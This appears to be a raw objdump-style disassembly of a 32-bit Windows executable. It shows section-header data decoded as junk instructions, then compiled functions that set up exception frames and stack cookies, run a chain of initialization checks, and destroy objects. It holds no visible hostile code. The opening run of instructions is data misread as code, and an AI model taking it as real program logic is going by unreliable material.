  401db3:	add    BYTE PTR [edi-0xb],dh
  401db6:	add    BYTE PTR [eax],al
  401db8:	lahf   
  401db9:	cmc    
  401dba:	add    BYTE PTR [eax],al
  401dbc:	shl    ebp,1
  401dbe:	add    BYTE PTR [eax],al
  401dc0:	stc    
  401dc1:	cmc    
  401dc2:	add    BYTE PTR [eax],al
  401dc4:	popa   
  401dc5:	test   BYTE PTR [eax],0x0
  401dc8:	fwait
  401dc9:	test   BYTE PTR [eax],0x0
  401dcc:	stc    
  401dcd:	test   BYTE PTR [eax],0x0
  401dd0:	sub    esi,edi
  401dd2:	add    BYTE PTR [eax],al
  401dd4:	test   DWORD PTR fs:[eax],0xf79d00
  401ddb:	add    cl,cl
  401ddd:	test   DWORD PTR [eax],0x44535200
  401de3:	push   ebx
  401de4:	push   ebp
  401de5:	scas   eax,DWORD PTR es:[edi]
  401de6:	in     eax,0x38
  401de8:	and    BYTE PTR [eax-0x6d],0x44
  401dec:	or     DWORD PTR [ebp+0x442df46a],0x1d813
  401df6:	add    BYTE PTR [eax],al
  401df8:	jae    0x401e73
  401dfa:	jae    0x401e65
  401dfc:	outs   dx,BYTE PTR ds:[esi]
  401dfd:	outs   dx,WORD PTR ds:[esi]
  401dff:	cs jo  0x401e66
  401e02:	bound  eax,QWORD PTR [eax]
	...
  401e18:	inc    edi
  401e19:	inc    ebx
  401e1a:	push   esp
  401e1b:	dec    esp
  401e1c:	add    BYTE PTR [eax],dl
  401e1e:	add    BYTE PTR [eax],al
  401e20:	add    al,0x0
  401e22:	add    BYTE PTR [eax],al
  401e24:	cs inc ebx
  401e26:	push   edx
  401e27:	push   esp
  401e28:	and    al,0x58
  401e2a:	inc    ebx
  401e2b:	inc    ecx
  401e2c:	add    BYTE PTR [eax],al
  401e2e:	add    BYTE PTR [eax],al
  401e30:	add    al,0x10
  401e32:	add    BYTE PTR [eax],al
  401e34:	add    al,0x0
  401e36:	add    BYTE PTR [eax],al
  401e38:	cs inc ebx
  401e3a:	push   edx
  401e3b:	push   esp
  401e3c:	and    al,0x58
  401e3e:	inc    ebx
  401e3f:	inc    ecx
  401e40:	inc    ecx
  401e41:	add    BYTE PTR [eax],al
  401e43:	add    BYTE PTR [eax],cl
  401e45:	adc    BYTE PTR [eax],al
  401e47:	add    BYTE PTR [eax+eax*1],al
  401e4a:	add    BYTE PTR [eax],al
  401e4c:	cs inc ebx
  401e4e:	push   edx
  401e4f:	push   esp
  401e50:	and    al,0x58
  401e52:	inc    ebx
  401e53:	pop    edx
  401e54:	add    BYTE PTR [eax],al
  401e56:	add    BYTE PTR [eax],al
  401e58:	or     al,0x10
  401e5a:	add    BYTE PTR [eax],al
  401e5c:	add    al,0x0
  401e5e:	add    BYTE PTR [eax],al
  401e60:	cs inc ebx
  401e62:	push   edx
  401e63:	push   esp
  401e64:	and    al,0x58
  401e66:	dec    ecx
  401e67:	inc    ecx
  401e68:	add    BYTE PTR [eax],al
  401e6a:	add    BYTE PTR [eax],al
  401e6c:	adc    BYTE PTR [eax],dl
  401e6e:	add    BYTE PTR [eax],al
  401e70:	add    al,0x0
  401e72:	add    BYTE PTR [eax],al
  401e74:	cs inc ebx
  401e76:	push   edx
  401e77:	push   esp
  401e78:	and    al,0x58
  401e7a:	dec    ecx
  401e7b:	inc    ecx
  401e7c:	inc    ecx
  401e7d:	add    BYTE PTR [eax],al
  401e7f:	add    BYTE PTR [eax+edx*1],dl
  401e82:	add    BYTE PTR [eax],al
  401e84:	add    al,0x0
  401e86:	add    BYTE PTR [eax],al
  401e88:	cs inc ebx
  401e8a:	push   edx
  401e8b:	push   esp
  401e8c:	and    al,0x58
  401e8e:	dec    ecx
  401e8f:	pop    ecx
  401e90:	add    BYTE PTR [eax],al
  401e92:	add    BYTE PTR [eax],al
  401e94:	sbb    BYTE PTR [eax],dl
  401e96:	add    BYTE PTR [eax],al
  401e98:	add    al,0x0
  401e9a:	add    BYTE PTR [eax],al
  401e9c:	cs inc ebx
  401e9e:	push   edx
  401e9f:	push   esp
  401ea0:	and    al,0x58
  401ea2:	dec    ecx
  401ea3:	pop    edx
  401ea4:	add    BYTE PTR [eax],al
  401ea6:	add    BYTE PTR [eax],al
  401ea8:	sbb    al,0x10
  401eaa:	add    BYTE PTR [eax],al
  401eac:	cmp    BYTE PTR [eax],al
  401eae:	add    BYTE PTR [eax],al
  401eb0:	imul   sp,WORD PTR cs:[si+0x73],0x7824
  401eb8:	add    BYTE PTR [eax],al
  401eba:	add    BYTE PTR [eax],al
  401ebc:	pusha  
  401ebd:	adc    BYTE PTR [eax],al
  401ebf:	add    al,dl
  401ec1:	or     al,0x0
  401ec3:	add    BYTE PTR [esi],ch
  401ec5:	jb     0x401f2b
  401ec7:	popa   
  401ec8:	je     0x401f2b
  401eca:	add    BYTE PTR [eax],al
  401ecc:	xor    BYTE PTR ds:0xb00000,bl
  401ed2:	add    BYTE PTR [eax],al
  401ed4:	cs jb  0x401f3b
  401ed7:	popa   
  401ed8:	je     0x401f3b
  401eda:	and    al,0x73
  401edc:	js     0x401f42
  401ede:	popa   
  401edf:	je     0x401f42
  401ee1:	add    BYTE PTR [eax],al
  401ee3:	add    al,ah
  401ee5:	sbb    eax,0x2200000
  401eea:	add    BYTE PTR [eax],al
  401eec:	cs jb  0x401f53
  401eef:	popa   
  401ef0:	je     0x401f53
  401ef2:	and    al,0x7a
  401ef4:	jp     0x401f70
  401ef6:	bound  esp,QWORD PTR fs:[edi+0x0]
  401efa:	add    BYTE PTR [eax],al
  401efc:	add    BYTE PTR [eax],ah
  401efe:	add    BYTE PTR [eax],al
  401f00:	pusha  
  401f01:	retf   
  401f02:	add    BYTE PTR [eax],al
  401f04:	cs je  0x401f6c
  401f07:	js     0x401f7d
  401f09:	and    al,0x6d
  401f0b:	outs   dx,BYTE PTR ds:[esi]
  401f0c:	add    BYTE PTR [eax],al
  401f0e:	add    BYTE PTR [eax],al
  401f10:	pusha  
  401f11:	jmp    0x401f13
  401f13:	add    BYTE PTR [ecx+0x2e00000c],dl
  401f19:	je     0x401f80
  401f1b:	js     0x401f91
  401f1d:	and    al,0x78
  401f1f:	add    al,bh
  401f21:	test   DWORD PTR [eax],0x161000
  401f27:	add    BYTE PTR [esi],ch
  401f29:	js     0x401f8f
  401f2b:	popa   
  401f2c:	je     0x401f8f
  401f2e:	and    al,0x78
  401f30:	add    BYTE PTR [eax],al
  401f32:	add    BYTE PTR [eax],al
  401f34:	add    BYTE PTR [eax],dl
  401f36:	add    DWORD PTR [eax],eax
  401f38:	adc    BYTE PTR [eax],al
  401f3a:	add    BYTE PTR [eax],al
  401f3c:	cs fs popa 
  401f3f:	je     0x401fa2
  401f41:	add    BYTE PTR [eax],al
  401f43:	add    BYTE PTR [eax],dl
  401f45:	adc    BYTE PTR [ecx],al
  401f47:	add    BYTE PTR [edx],bh
  401f49:	add    BYTE PTR [eax],al
  401f4b:	add    BYTE PTR [esi],ch
  401f4d:	fs popa 
  401f4f:	je     0x401fb2
  401f51:	and    al,0x72
  401f53:	add    BYTE PTR [eax+0x10],dl
  401f56:	add    DWORD PTR [eax],eax
  401f58:	jl     0x401f5e
  401f5a:	add    BYTE PTR [eax],al
  401f5c:	bound  esi,QWORD PTR cs:[ebx+0x73]
  401f60:	add    BYTE PTR [eax],al
  401f62:	add    BYTE PTR [eax],al
  401f64:	add    BYTE PTR [eax],ah
  401f66:	add    DWORD PTR [eax],eax
  401f68:	mov    WORD PTR [edx],es
  401f6a:	add    BYTE PTR [eax],al
  401f6c:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x352461
  401f75:	add    BYTE PTR [eax],al
  401f77:	add    BYTE PTR [edx+eiz*1+0x40001],cl
  401f7e:	add    BYTE PTR [eax],al
  401f80:	xor    BYTE PTR cs:[eax],dh
  401f83:	arpl   WORD PTR [esi+0x67],sp
  401f86:	add    BYTE PTR [eax],al
  401f88:	nop
  401f89:	and    al,BYTE PTR [ecx]
  401f8b:	add    BYTE PTR [ecx+eax*1],al
  401f8e:	add    BYTE PTR [eax],al
  401f90:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x322461
  401f99:	add    BYTE PTR [eax],al
  401f9b:	add    BYTE PTR [ebx+eiz*1+0x140001],dl
  401fa2:	add    BYTE PTR [eax],al
  401fa4:	imul   esp,DWORD PTR cs:[ecx+eiz*2+0x74],0x332461
  401fad:	add    BYTE PTR [eax],al
  401faf:	add    BYTE PTR [eax-0x73fffedd],ch
  401fb5:	add    al,BYTE PTR [eax]
  401fb7:	add    BYTE PTR [esi],ch
  401fb9:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x342461
  401fc1:	add    BYTE PTR [eax],al
  401fc3:	add    BYTE PTR [esi+eiz*1],dh
  401fc6:	add    DWORD PTR [eax],eax
  401fc8:	mov    ds:0x2e00000a,al
  401fcd:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x362461
  401fd5:	add    BYTE PTR [eax],al
  401fd7:	add    BYTE PTR [eax],al
  401fd9:	inc    eax
  401fda:	add    DWORD PTR [eax],eax
  401fdc:	lock add BYTE PTR [eax],al
  401fdf:	add    BYTE PTR [esi],ch
  401fe1:	jb     0x402056
  401fe3:	jb     0x402048
  401fe5:	and    al,0x30
  401fe7:	xor    DWORD PTR [eax],eax
  401fe9:	add    BYTE PTR [eax],al
  401feb:	add    al,dh
  401fed:	inc    eax
  401fee:	add    DWORD PTR [eax],eax
  401ff0:	and    BYTE PTR [edi],al
  401ff2:	add    BYTE PTR [eax],al
  401ff4:	cs jb  0x40206a
  401ff7:	jb     0x40205c
  401ff9:	and    al,0x30
  401ffb:	xor    al,BYTE PTR [eax]
	...
  402005:	mov    edi,edi
  402007:	push   ebp
  402008:	mov    ebp,esp
  40200a:	and    esp,0xfffffff8
  40200d:	push   0xffffffff
  40200f:	push   0x40eb91
  402014:	mov    eax,fs:0x0
  40201a:	push   eax
  40201b:	sub    esp,0x68
  40201e:	mov    eax,ds:0x411004
  402023:	xor    eax,esp
  402025:	mov    DWORD PTR [esp+0x60],eax
  402029:	push   ebx
  40202a:	push   esi
  40202b:	push   edi
  40202c:	mov    eax,ds:0x411004
  402031:	xor    eax,esp
  402033:	push   eax
  402034:	lea    eax,[esp+0x78]
  402038:	mov    fs:0x0,eax
  40203e:	mov    esi,DWORD PTR [ebp+0xc]
  402041:	lea    ecx,[esp+0x14]
  402045:	call   DWORD PTR ds:0x4121c4
  40204b:	xor    edi,edi
  40204d:	mov    DWORD PTR [esp+0x80],edi
  402054:	lea    ecx,[esp+0x18]
  402058:	call   DWORD PTR ds:0x4121c4
  40205e:	xor    ebx,ebx
  402060:	inc    ebx
  402061:	mov    BYTE PTR [esp+0x80],bl
  402068:	lea    ecx,[esp+0x1c]
  40206c:	call   DWORD PTR ds:0x4121c4
  402072:	mov    BYTE PTR [esp+0x80],0x2
  40207a:	lea    ecx,[esp+0x54]
  40207e:	call   DWORD PTR ds:0x4121c4
  402084:	mov    BYTE PTR [esp+0x80],0x3
  40208c:	mov    DWORD PTR [esp+0x68],edi
  402090:	mov    DWORD PTR [esp+0x64],edi
  402094:	mov    DWORD PTR [esp+0x20],edi
  402098:	mov    DWORD PTR [esp+0x24],edi
  40209c:	mov    DWORD PTR [esp+0x58],edi
  4020a0:	mov    DWORD PTR [esp+0x44],edi
  4020a4:	mov    DWORD PTR [esp+0x4c],edi
  4020a8:	mov    DWORD PTR [esp+0x48],edi
  4020ac:	mov    DWORD PTR [esp+0x28],edi
  4020b0:	mov    DWORD PTR [esp+0x5c],edi
  4020b4:	mov    DWORD PTR [esp+0x80],0x4
  4020bf:	lea    ecx,[esp+0x14]
  4020c3:	call   0x405a51
  4020c8:	test   eax,eax
  4020ca:	je     0x40212d
  4020cc:	push   esi
  4020cd:	push   DWORD PTR [ebp+0x8]
  4020d0:	lea    ecx,[esp+0x1c]
  4020d4:	call   0x408c42
  4020d9:	test   eax,eax
  4020db:	je     0x40212d
  4020dd:	cmp    DWORD PTR [esp+0x64],ebx
  4020e1:	jne    0x402113
  4020e3:	mov    edi,0x3e9
  4020e8:	mov    ecx,edi
  4020ea:	call   0x4098dc
  4020ef:	push   ebx
  4020f0:	mov    esi,eax
  4020f2:	call   0x40e9c1
  4020f7:	pop    ecx
  4020f8:	mov    edx,esi
  4020fa:	mov    ecx,eax
  4020fc:	call   0x40a377
  402101:	inc    edi
  402102:	cmp    edi,0x404
  402108:	jbe    0x4020e8
  40210a:	call   0x409789
  40210f:	xor    ebx,ebx
  402111:	jmp    0x40215a
  402113:	lea    ecx,[esp+0x14]
  402117:	call   0x402190
  40211c:	test   eax,eax
  40211e:	je     0x40212d
  402120:	lea    ecx,[esp+0x14]
  402124:	call   0x402241
  402129:	test   eax,eax
  40212b:	jne    0x402148
  40212d:	push   0x2
  40212f:	call   0x40e9c1
  402134:	pop    ecx
  402135:	mov    edx,0x20001
  40213a:	mov    ecx,eax
  40213c:	call   0x4096f1
  402141:	call   0x409789
  402146:	jmp    0x40215a
  402148:	push   ecx
  402149:	push   ecx
  40214a:	lea    ecx,[esp+0x1c]
  40214e:	call   0x409003
  402153:	call   0x409789
  402158:	mov    ebx,edi
  40215a:	or     DWORD PTR [esp+0x80],0xffffffff
  402162:	lea    ecx,[esp+0x14]
  402166:	call   0x40599a
  40216b:	mov    eax,ebx
  40216d:	mov    ecx,DWORD PTR [esp+0x78]
  402171:	mov    DWORD PTR fs:0x0,ecx
  402178:	pop    ecx
  402179:	pop    edi
  40217a:	pop    esi
  40217b:	pop    ebx
  40217c:	mov    ecx,DWORD PTR [esp+0x60]
  402180:	xor    ecx,esp
  402182:	call   0x40e2c0
  402187:	mov    esp,ebp
  402189:	pop    ebp
  40218a:	ret    
  40218b:	int3   
  40218c:	int3   
  40218d:	int3   
  40218e:	int3   
  40218f:	int3   
  402190:	mov    edi,edi
  402192:	push   ebp
  402193:	mov    ebp,esp
  402195:	push   ecx
  402196:	push   ebx
  402197:	push   esi
  402198:	mov    esi,ecx
  40219a:	and    DWORD PTR [ebp-0x4],0x0
  40219e:	push   edi
  40219f:	lea    eax,[ebp-0x4]
  4021a2:	lea    ecx,[esi+0x10]
  4021a5:	push   ecx
  4021a6:	push   ecx
  4021a7:	push   eax
  4021a8:	push   ecx
  4021a9:	push   DWORD PTR [esi+0x38]
  4021ac:	lea    ebx,[esi+0x44]
  4021af:	mov    edx,ecx
  4021b1:	mov    ecx,DWORD PTR [esi+0xc]
  4021b4:	lea    eax,[esi+0x8]
  4021b7:	push   ebx
  4021b8:	push   eax
  4021b9:	lea    eax,[esi+0x4]
  4021bc:	push   eax
  4021bd:	push   DWORD PTR [esi]
  4021bf:	call   0x406c19
  4021c4:	mov    edi,eax
  4021c6:	test   edi,edi
  4021c8:	jne    0x4021ce
  4021ca:	xor    eax,eax
  4021cc:	jmp    0x402235
  4021ce:	call   DWORD PTR ds:0x4120cc
  4021d4:	mov    ecx,0x80041064
  4021d9:	cmp    eax,ecx
  4021db:	jne    0x402209
  4021dd:	call   0x407454
  4021e2:	push   0x2
  4021e4:	call   0x40e9c1
  4021e9:	pop    ecx
  4021ea:	mov    edx,0x20004
  4021ef:	mov    ecx,eax
  4021f1:	call   0x4096f1
  4021f6:	cmp    DWORD PTR [esi+0x14],0x0
  4021fa:	je     0x402209
  4021fc:	lea    eax,[esi+0x18]
  4021ff:	push   eax
  402200:	push   DWORD PTR [esi+0x14]
  402203:	call   DWORD PTR ds:0x4120c8
  402209:	cmp    DWORD PTR [ebp-0x4],0x0
  40220d:	jne    0x402233
  40220f:	mov    edx,DWORD PTR [ebx]
  402211:	mov    ecx,DWORD PTR [esi+0x10]
  402214:	call   0x408400
  402219:	cmp    eax,0x1388
  40221e:	jae    0x402233
  402220:	mov    ecx,0x1580
  402225:	call   0x4098dc
  40222a:	mov    ecx,eax
  40222c:	call   0x4094c8
  402231:	jmp    0x4021ca
  402233:	mov    eax,edi
  402235:	pop    edi
  402236:	pop    esi
  402237:	pop    ebx
  402238:	mov    esp,ebp
  40223a:	pop    ebp
  40223b:	ret    
  40223c:	int3   
  40223d:	int3   
  40223e:	int3   
  40223f:	int3   
  402240:	int3   
  402241:	mov    edi,edi
  402243:	push   esi
  402244:	mov    esi,ecx
  402246:	call   0x402416
  40224b:	test   eax,eax
  40224d:	jne    0x402253
  40224f:	xor    eax,eax
  402251:	pop    esi
  402252:	ret    
  402253:	mov    ecx,esi
  402255:	call   0x403323
  40225a:	test   eax,eax
  40225c:	je     0x40224f
  40225e:	mov    ecx,esi
  402260:	call   0x403f93
  402265:	test   eax,eax
  402267:	je     0x40224f
  402269:	mov    ecx,esi
  40226b:	call   0x4038f4
  402270:	test   eax,eax
  402272:	je     0x40224f
  402274:	mov    ecx,esi
  402276:	call   0x40427c
  40227b:	test   eax,eax
  40227d:	je     0x40224f
  40227f:	mov    ecx,esi
  402281:	call   0x403c45
  402286:	test   eax,eax
  402288:	je     0x40224f
  40228a:	mov    ecx,esi
  40228c:	call   0x404df0
  402291:	test   eax,eax
  402293:	je     0x40224f
  402295:	mov    ecx,esi
  402297:	call   0x403dcd
  40229c:	test   eax,eax
  40229e:	je     0x40224f
  4022a0:	mov    ecx,esi
  4022a2:	call   0x40440c
  4022a7:	test   eax,eax
  4022a9:	je     0x40224f
  4022ab:	mov    ecx,esi
  4022ad:	call   0x404703
  4022b2:	test   eax,eax
  4022b4:	je     0x40224f
  4022b6:	mov    ecx,esi
  4022b8:	call   0x404eb4
  4022bd:	test   eax,eax
  4022bf:	je     0x40224f
  4022c1:	mov    ecx,DWORD PTR [esi+0x14]
  4022c4:	lea    eax,[esi+0x18]
  4022c7:	push   eax
  4022c8:	xor    edx,edx
  4022ca:	call   0x405320
  4022cf:	xor    eax,eax
  4022d1:	inc    eax
  4022d2:	pop    esi
  4022d3:	ret    
  4022d4:	int3   
  4022d5:	int3   
  4022d6:	int3   
  4022d7:	int3   
  4022d8:	int3   
  4022d9:	push   0x24
  4022db:	mov    eax,0x40ebbe
  4022e0:	call   0x40eaf2
  4022e5:	mov    DWORD PTR [ebp-0x30],edx
  4022e8:	mov    DWORD PTR [ebp-0x2c],ecx
  4022eb:	lea    esi,[ebp+0x8]
  4022ee:	lea    edi,[ebp-0x24]
  4022f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022f5:	xor    eax,eax
  4022f7:	mov    WORD PTR [ebp-0x16],ax
  4022fb:	call   DWORD PTR ds:0x412084
  402301:	mov    DWORD PTR [ebp-0x28],eax
  402304:	xor    edx,edx
  402306:	mov    ebx,edx
  402308:	mov    ecx,eax
  40230a:	and    ecx,0x3ff
  402310:	xor    esi,esi
  402312:	inc    esi
  402313:	cmp    cx,si
  402316:	je     0x402336
  402318:	cmp    cx,0xd
  40231c:	je     0x402336
  40231e:	cmp    cx,0x1e
  402322:	je     0x402336
  402324:	cmp    cx,0x39
  402328:	je     0x402336
  40232a:	cmp    cx,0x49
  40232e:	je     0x402336
  402330:	cmp    cx,0x29
  402334:	jne    0x402340
  402336:	mov    ebx,esi
  402338:	mov    eax,0x409
  40233d:	mov    DWORD PTR [ebp-0x28],eax
  402340:	mov    DWORD PTR [ebp-0x4],edx
  402343:	lea    edi,[ebx-0x1]
  402346:	neg    edi
  402348:	sbb    edi,edi
  40234a:	not    edi
  40234c:	and    edi,0x401090
  402352:	push   edx
  402353:	push   edx
  402354:	push   edi
  402355:	lea    ecx,[ebp-0x24]
  402358:	push   ecx
  402359:	push   edx
  40235a:	push   eax
  40235b:	call   DWORD PTR ds:0x412060
  402361:	mov    esi,eax
  402363:	lea    edx,[esi+0x1]
  402366:	push   edx
  402367:	mov    ecx,DWORD PTR [ebp-0x2c]
  40236a:	call   DWORD PTR ds:0x4121c8
  402370:	push   esi
  402371:	push   eax
  402372:	push   edi
  402373:	lea    eax,[ebp-0x24]
  402376:	push   eax
  402377:	xor    esi,esi
  402379:	push   esi
  40237a:	push   DWORD PTR [ebp-0x28]
  40237d:	call   DWORD PTR ds:0x412060
  402383:	or     DWORD PTR [ebp-0x4],0xffffffff
  402387:	mov    DWORD PTR [ebp-0x4],0x2
  40238e:	dec    ebx
  40238f:	neg    ebx
  402391:	sbb    ebx,ebx
  402393:	not    ebx
  402395:	and    ebx,0x4010a8
  40239b:	push   esi
  40239c:	push   esi
  40239d:	push   ebx
  40239e:	lea    eax,[ebp-0x24]
  4023a1:	push   eax
  4023a2:	push   esi
  4023a3:	mov    edi,0x400
  4023a8:	push   edi
  4023a9:	call   DWORD PTR ds:0x412018
  4023af:	mov    esi,eax
  4023b1:	lea    edx,[esi+0x1]
  4023b4:	push   edx
  4023b5:	mov    ecx,DWORD PTR [ebp-0x30]
  4023b8:	call   DWORD PTR ds:0x4121c8
  4023be:	push   esi
  4023bf:	push   eax
  4023c0:	push   ebx
  4023c1:	lea    ecx,[ebp-0x24]
  4023c4:	push   ecx
  4023c5:	push   0x0
  4023c7:	push   edi
  4023c8:	call   DWORD PTR ds:0x412018
  4023ce:	or     DWORD PTR [ebp-0x4],0xffffffff
  4023d2:	xor    eax,eax
  4023d4:	inc    eax
  4023d5:	jmp    0x4023f3
  4023d7:	push   0x8007000e
  4023dc:	call   DWORD PTR ds:0x412014
  4023e2:	call   0x4095c0
  4023e7:	mov    eax,0x4023ed
  4023ec:	ret    
  4023ed:	or     DWORD PTR [ebp-0x4],0xffffffff
  4023f1:	xor    eax,eax
  4023f3:	call   0x40ea30
  4023f8:	ret    0x10
  4023fb:	push   0x8007000e
  402400:	call   DWORD PTR ds:0x412014
  402406:	call   0x4095c0
  40240b:	mov    eax,0x4023ed
  402410:	ret    
  402411:	int3   
  402412:	int3   
  402413:	int3   
  402414:	int3   
  402415:	int3   
  402416:	push   0x11c
  40241b:	mov    eax,0x40ed22
  402420:	call   0x40eaf2
  402425:	mov    ebx,ecx
  402427:	and    DWORD PTR [ebp-0xfc],0x0
  40242e:	lea    ecx,[ebp-0x80]
  402431:	call   DWORD PTR ds:0x4121c4
  402437:	and    DWORD PTR [ebp-0x4],0x0
  40243b:	lea    ecx,[ebp-0x90]
  402441:	call   DWORD PTR ds:0x4121c4
  402447:	mov    BYTE PTR [ebp-0x4],0x1
  40244b:	and    DWORD PTR [ebp-0x64],0x0
  40244f:	and    DWORD PTR [ebp-0xc4],0x0
  402456:	lea    ecx,[ebp-0x88]
  40245c:	call   DWORD PTR ds:0x4121c4
  402462:	mov    BYTE PTR [ebp-0x4],0x2
  402466:	lea    ecx,[ebp-0x84]
  40246c:	call   DWORD PTR ds:0x4121c4
  402472:	mov    BYTE PTR [ebp-0x4],0x3
  402476:	lea    ecx,[ebp-0x68]
  402479:	call   DWORD PTR ds:0x4121c4
  40247f:	mov    BYTE PTR [ebp-0x4],0x4
  402483:	lea    ecx,[ebp-0x7c]
  402486:	call   DWORD PTR ds:0x4121c4
  40248c:	mov    BYTE PTR [ebp-0x4],0x5
  402490:	lea    ecx,[ebp-0xa8]
  402496:	call   DWORD PTR ds:0x4121c4
  40249c:	mov    BYTE PTR [ebp-0x4],0x6
  4024a0:	lea    ecx,[ebp-0x9c]
  4024a6:	call   DWORD PTR ds:0x4121c4
  4024ac:	mov    BYTE PTR [ebp-0x4],0x7
  4024b0:	lea    ecx,[ebp-0xa0]
  4024b6:	call   DWORD PTR ds:0x4121c4
  4024bc:	mov    BYTE PTR [ebp-0x4],0x8
  4024c0:	lea    ecx,[ebp-0x94]
  4024c6:	call   DWORD PTR ds:0x4121c4
  4024cc:	mov    BYTE PTR [ebp-0x4],0x9
  4024d0:	lea    ecx,[ebp-0xac]
  4024d6:	call   DWORD PTR ds:0x4121c4
  4024dc:	mov    BYTE PTR [ebp-0x4],0xa
  4024e0:	lea    ecx,[ebp-0x8c]
  4024e6:	call   DWORD PTR ds:0x4121c4
  4024ec:	mov    BYTE PTR [ebp-0x4],0xb
  4024f0:	lea    ecx,[ebp-0xa4]
  4024f6:	call   DWORD PTR ds:0x4121c4
  4024fc:	mov    BYTE PTR [ebp-0x4],0xc
  402500:	lea    ecx,[ebp-0xb0]
  402506:	call   DWORD PTR ds:0x4121c4
  40250c:	mov    BYTE PTR [ebp-0x4],0xd
  402510:	lea    ecx,[ebp-0x98]
  402516:	call   DWORD PTR ds:0x4121c4
  40251c:	mov    BYTE PTR [ebp-0x4],0xe
  402520:	lea    ecx,[ebp-0x74]
  402523:	call   DWORD PTR ds:0x4121c4
  402529:	mov    BYTE PTR [ebp-0x4],0xf
  40252d:	lea    ecx,[ebp-0x6c]
  402530:	call   DWORD PTR ds:0x4121c4
  402536:	mov    BYTE PTR [ebp-0x4],0x10
  40253a:	lea    ecx,[ebp-0x70]
  40253d:	call   DWORD PTR ds:0x4121c4
  402543:	mov    BYTE PTR [ebp-0x4],0x11
  402547:	lea    ecx,[ebp-0x78]
  40254a:	call   DWORD PTR ds:0x4121c4
  402550:	mov    BYTE PTR [ebp-0x4],0x12
  402554:	lea    ecx,[ebp-0xb8]
  40255a:	call   DWORD PTR ds:0x4121c4
  402560:	mov    BYTE PTR [ebp-0x4],0x13
  402564:	lea    eax,[ebx+0x18]
  402567:	push   eax
  402568:	mov    ecx,0x227
  40256d:	call   0x4098dc
  402572:	mov    edx,eax
  402574:	mov    ecx,DWORD PTR [ebx+0x14]
  402577:	call   0x405320
  40257c:	mov    BYTE PTR [ebp-0x4],0x14
  402580:	fwait
  402581:	push   0x4010bc
  402586:	lea    ecx,[ebp-0xec]
  40258c:	call   0x40594b
  402591:	mov    DWORD PTR [ebp-0x100],eax
  402597:	mov    BYTE PTR [ebp-0x4],0x15
  40259b:	mov    eax,DWORD PTR [eax]
  40259d:	test   eax,eax
  40259f:	je     0x4025a5
  4025a1:	mov    ecx,DWORD PTR [eax]
  4025a3:	jmp    0x4025a7
  4025a5:	xor    ecx,ecx
  4025a7:	mov    eax,DWORD PTR [ebx+0x10]
  4025aa:	mov    esi,DWORD PTR [eax]
  4025ac:	lea    edx,[ebp-0xc4]
  4025b2:	push   edx
  4025b3:	push   0x0
  4025b5:	push   0x30
  4025b7:	push   ecx
  4025b8:	push   eax
  4025b9:	mov    ecx,DWORD PTR [esi+0x48]
  4025bc:	call   DWORD PTR ds:0x41228c
  4025c2:	call   DWORD PTR [esi+0x48]
  4025c5:	mov    esi,eax
  4025c7:	mov    BYTE PTR [ebp-0x4],0x14
  4025cb:	lea    ecx,[ebp-0xec]
  4025d1:	call   0x4058ac
  4025d6:	test   esi,esi
  4025d8:	jns    0x402718
  4025de:	mov    ecx,esi
  4025e0:	call   0x407454
  4025e5:	mov    BYTE PTR [ebp-0x4],0x12
  4025e9:	lea    ecx,[ebp-0xb8]
  4025ef:	call   DWORD PTR ds:0x4121c0
  4025f5:	mov    BYTE PTR [ebp-0x4],0x11
  4025f9:	lea    ecx,[ebp-0x78]
  4025fc:	call   DWORD PTR ds:0x4121c0
  402602:	mov    BYTE PTR [ebp-0x4],0x10
  402606:	lea    ecx,[ebp-0x70]
  402609:	call   DWORD PTR ds:0x4121c0
  40260f:	mov    BYTE PTR [ebp-0x4],0xf
  402613:	lea    ecx,[ebp-0x6c]
  402616:	call   DWORD PTR ds:0x4121c0
  40261c:	mov    BYTE PTR [ebp-0x4],0xe
  402620:	lea    ecx,[ebp-0x74]
  402623:	call   DWORD PTR ds:0x4121c0
  402629:	mov    BYTE PTR [ebp-0x4],0xd
  40262d:	lea    ecx,[ebp-0x98]
  402633:	call   DWORD PTR ds:0x4121c0
  402639:	mov    BYTE PTR [ebp-0x4],0xc
  40263d:	lea    ecx,[ebp-0xb0]
  402643:	call   DWORD PTR ds:0x4121c0
  402649:	mov    BYTE PTR [ebp-0x4],0xb
  40264d:	lea    ecx,[ebp-0xa4]
  402653:	call   DWORD PTR ds:0x4121c0
  402659:	mov    BYTE PTR [ebp-0x4],0xa
  40265d:	lea    ecx,[ebp-0x8c]
  402663:	call   DWORD PTR ds:0x4121c0
  402669:	mov    BYTE PTR [ebp-0x4],0x9
  40266d:	lea    ecx,[ebp-0xac]
  402673:	call   DWORD PTR ds:0x4121c0
  402679:	mov    BYTE PTR [ebp-0x4],0x8
  40267d:	lea    ecx,[ebp-0x94]
  402683:	call   DWORD PTR ds:0x4121c0
  402689:	mov    BYTE PTR [ebp-0x4],0x7
  40268d:	lea    ecx,[ebp-0xa0]
  402693:	call   DWORD PTR ds:0x4121c0
  402699:	mov    BYTE PTR [ebp-0x4],0x6
  40269d:	lea    ecx,[ebp-0x9c]
  4026a3:	call   DWORD PTR ds:0x4121c0
  4026a9:	mov    BYTE PTR [ebp-0x4],0x5
  4026ad:	lea    ecx,[ebp-0xa8]
  4026b3:	call   DWORD PTR ds:0x4121c0
  4026b9:	mov    BYTE PTR [ebp-0x4],0x4
  4026bd:	lea    ecx,[ebp-0x7c]
  4026c0:	call   DWORD PTR ds:0x4121c0
  4026c6:	mov    BYTE PTR [ebp-0x4],0x3
  4026ca:	lea    ecx,[ebp-0x68]
  4026cd:	call   DWORD PTR ds:0x4121c0
  4026d3:	mov    BYTE PTR [ebp-0x4],0x2
  4026d7:	lea    ecx,[ebp-0x84]
  4026dd:	call   DWORD PTR ds:0x4121c0
  4026e3:	mov    BYTE PTR [ebp-0x4],0x1
  4026e7:	lea    ecx,[ebp-0x88]
  4026ed:	call   DWORD PTR ds:0x4121c0
  4026f3:	mov    BYTE PTR [ebp-0x4],0x0
  4026f7:	lea    ecx,[ebp-0x90]
  4026fd:	call   DWORD PTR ds:0x4121c0
  402703:	or     DWORD PTR [ebp-0x4],0xffffffff
